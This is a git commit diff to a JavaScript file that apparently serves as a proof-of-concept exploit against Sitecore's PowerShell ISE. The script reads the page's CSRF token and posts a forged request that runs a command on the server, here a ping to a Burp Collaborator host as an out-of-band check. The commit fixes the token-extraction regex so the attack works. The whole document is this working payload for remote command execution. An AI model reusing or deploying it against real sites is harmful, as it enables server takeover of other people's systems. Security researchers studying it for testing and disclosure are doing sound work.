20736aa5d7c5212cce9a234c187586934020c63a
portalstr <92850422+portalstr@users.noreply.github.com>
2021-11-04 15:25:43 +0200

    Update index.js

--- index.js
+++ index.js
@@ -13,7 +13,7 @@ req.onload = handleResponse;
 req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
 req.send();
 function handleResponse() {
-    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[2];
+    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
     changeReq.send('&__PARAMETERS=pstaskmonitor%3Acheck&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN='+token+'&__VIEWSTATE=&scActiveRibbonStrip=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20md3zgmlfptx9nyeladjwxhwe45axym.burpcollaborator.net')
